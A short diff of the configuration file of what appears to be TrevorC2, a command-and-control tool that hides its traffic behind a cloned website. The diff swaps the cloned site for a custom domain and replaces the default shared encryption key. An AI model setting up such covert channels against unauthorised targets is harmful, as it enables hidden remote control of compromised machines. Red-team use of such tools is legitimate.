@@ -13,7 +13,7 @@ via a query string parameter.
 """
 
 # CONFIG CONSTANTS:
-URL = ("https://www.google.com")  # URL to clone to house a legitimate website
+URL = ("https://atreyu.needmyown.net")  # URL to clone to house a legitimate website
 USER_AGENT = ("User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko")
 
 # THIS IS WHAT PATH WE WANT TO HIT FOR CODE - THIS CAN BE WHATEVER PATH YOU WANT
@@ -33,7 +33,7 @@ SSL = False
 CERT_FILE = ""  # Your Certificate for SSL
 
 # THIS IS OUR ENCRYPTION KEY - THIS NEEDS TO BE THE SAME ON BOTH SERVER AND CLIENT FOR APPROPRIATE DECRYPTION. RECOMMEND CHANGING THIS FROM THE DEFAULT KEY
-CIPHER = ("Tr3v0rC2R0x@nd1s@w350m3#TrevorForget")
+CIPHER = ("BoB4RN3d7RiW4*pc3!jN5mElJdm#G^uV")
 
 # DO NOT CHANGE BELOW THIS LINE
 
